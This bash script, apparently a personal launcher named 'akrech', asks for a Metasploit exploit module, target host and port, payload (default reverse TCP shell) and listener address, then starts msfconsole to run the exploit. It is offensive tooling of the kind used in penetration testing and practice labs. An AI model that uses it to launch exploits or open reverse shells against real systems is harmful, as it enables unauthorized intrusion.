#!/bin/bash

#color-foregground
r='\e[31m'
lr='\e[1;31m'
g='\e[32m'
lg='\e[1;32m'
y='\e[1;33m'
brn='\e[33m'
b='\e[34m'
prpl='\e[35m'
cyan='\e[36m'
lightgray='\e[37m'
S='\e[0m'

#text design
bold='\e[1m'
under_line='\e[4m'
B='\e[5m'


#collect local ip addresses
eth0=`ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
tun0=`ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`
wlan0=`ip -4 addr show wlan0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`

clear;

#banner
echo -e "\e[40;38;5;82mgithub:- a-k-r-e-c-h
\e[30;48;5;82mmail:- akrech@protonmail.com${S}"
for i in {16..21} {21..16} ; do echo -en "\e[38;5;${i}m######${S}" ; done ; echo
echo -e "\e[31m<==============================${S}\e[1m\e[5mHAPPY-HUNTING${S}\e[31m===========================>${S}"
for i in {16..21} {21..16} ; do echo -en "\e[38;5;${i}m######${S}" ; done ; echo 


#collect exploit module
echo -e ${g}" ┌─[${r}akrec${B}H${S}${g}]────────────[${b}EXPLOIT${g}]${S} ${g}[default: exploit/multi/handler]\n │ \t\t\t\t [press 'enter' for auto selection]         "
echo -ne $okegreen" └─────► ${S}" ;        
read EXPLOIT

#collect rhost
echo -e ${g}" ┌─[${r}${B}a${S}${r}krecH${g}]────────────[${b}RHOST${g}]${S} ${g}[press 'enter' if RHOST not needed]\n │ \t\t\t\t\t\t\t\t"
echo -ne $g" └─────► ${S}" ;        
read RHOST

#collect rport
echo -e ${g}" ┌─[${r}akre${B}c${S}${r}H${g}]────────────[${b}RPORT${g}]${S} ${g}[press 'enter' if RPORT not needed]\n │\t\t\t\t\t\t\t\t"
echo -ne $g" └─────► ${S}" ;        
read RPORT

#collect payload module
echo -e ${g}" ┌─[${r}a${B}k${S}${r}recH${g}]────────────[${b}PAYLOAD${g}]${S} ${g}[default: generic/shell_reverse_tcp]\n │\t\t\t\t [press 'enter' for auto selection]"
echo -ne $g" └─────► ${S}" ;        
read PAYLOAD

#collect the lhost or the local ip
if [ -z $eth0 ]
then
echo -e ${g}" ┌─[${r}akr${B}e${S}${r}cH${g}]────────────[${b}LHOST${g}]${S} ${g}[wlan0 -> $wlan0]\n │\t\t\t       [tun0 -> $tun0]"
echo -ne $g" └─────► ${S}" ;        
read IP
elif [ -z $tun0 ]
then
echo -e ${g}" ┌─[${r}akr${B}e${S}${r}cH${g}]────────────[${b}LHOST${g}]${S} ${g}[wlan0 -> $wlan0]\n │\t\t\t       [eth0 -> $eth0]"
echo -ne $g" └─────► ${S}" ;        
read IP
else
echo -e ${g}" ┌─[${r}akr${B}e${S}${r}cH${g}]────────────[${b}LHOST${g}]${S} ${g}[eth0 -> $eth0]\n │\t\t\t       [tun0 -> $tun0]"
echo -ne $g" └─────► ${S}" ;        
read IP
fi

#colllect lport
echo -e ${g}" ┌─[${r}ak${B}r${S}${r}ecH${g}]────────────[${b}LPORT${g}]${S} ${g}[default: 4444]\n │\t\t\t       [press 'enter' for auto selection]"
echo -ne $g" └─────► ${S}" ;        
read PORT


echo -e "${b}[*]Starting${S} ${lr}Metasploit${S} ${b}with given commands...${S}"
sleep 1
if [ -z $IP ]
then
echo -e "${r}[!]invalid LHOST${S}"
sleep 1
echo -e "${b}[!]try again...${S}"
exit
else
echo -e "${b}[*]set LHOST as $IP${S}"
sleep 1
fi




if [ -z "$PORT" ]
then
    echo -e "${b}[*]set LPORT as 4444${S}" 
else
    echo -e "${b}[*]set LPORT as $PORT${S}"
fi




sleep 1
echo -e "${cyan}[*]press (CTRL + C) or re-run akrech, if you want any change in modules...${S}"
sleep 1
echo -e "${cyan}[!]${S}\e[41makrech${S}${cyan} is going to clear your terminal, for a clear view... ${S}"
sleep 1

#starts metasploit with collected commands
msfconsole -q -x "
clear;
use exploit/multi/handler;
clear;
use $EXPLOIT;
set payload $PAYLOAD;
clear;
set rhost $RHOST;
set rport $RPORT;
set lport $PORT;
set lhost $IP;
clear;
exploit ;"
